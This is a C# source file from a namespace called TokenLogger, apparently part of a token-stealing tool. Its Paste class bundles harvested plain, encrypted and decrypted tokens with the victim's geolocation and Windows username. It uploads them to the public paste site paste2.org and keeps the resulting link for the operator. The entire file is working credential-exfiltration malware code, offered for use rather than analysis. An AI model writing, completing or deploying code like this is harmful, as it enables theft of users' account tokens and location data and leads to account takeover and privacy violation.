using System;
using System.Net.Http;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace TokenLogger
{
    internal class Paste
    {
        public string FinalUrl { get; protected set; } = String.Empty;
        private string BaseUrl { get; set; } = "https://paste2.org";
        private Regex PastePattern { get; set; }
        private Dictionary<string, string> PasteFormData { get; set; }

        public void UploadPaste(List<string> NT, List<string> ET, List<string> DT, List<string> location)
        {
            this.PastePattern = new Regex(@"https:\/\/paste2\.org\/pastes\/[A-Za-z0-9]{8}");

            this.PasteFormData = new Dictionary<string, string>()
            {
                {
                    "code",
                    $"Normal tokens: \n{String.Join('\n', NT)} \n \n" +
                    $"Encrypted tokens: \n{String.Join('\n', ET)} \n \n" +
                    $"Decrypted tokens: \n{String.Join('\n', DT)} \n \n" +
                    $"Geolocation information: \n{String.Join('\n', location)}\n \n"
                },

                {
                    "lang",
                    "text"
                },

                {
                    "description",
                    $"Tokens for user: {Environment.UserName} \n" +
                    $"Paste uploaded at: {DateTime.Now}"
                }
            };

            try
            {
                using (HttpClient httpClient = new HttpClient())
                {
                    var POST = httpClient.PostAsync(this.BaseUrl, new FormUrlEncodedContent(this.PasteFormData)).GetAwaiter().GetResult();
                    var GET = POST.Content.ReadAsStringAsync().Result;

                    Match GETMatch = this.PastePattern.Match(GET);
                    this.FinalUrl = GETMatch.Value;
                    this.FinalUrl = this.FinalUrl.Remove(GETMatch.Value.IndexOf("/pastes"), 7);
                }

                SetConsoleColor.Color(ConsoleColor.Green);
                Console.WriteLine("[+] Paste uploaded successfully!");
            }
            catch (HttpRequestException)
            {
                SetConsoleColor.Color(ConsoleColor.Red);
                Console.WriteLine("[!] HTTPERROR: Couldn't upload paste. Please open an issue in the GitHub repository and I will look at it!");
                return;
            }
        }
    }
}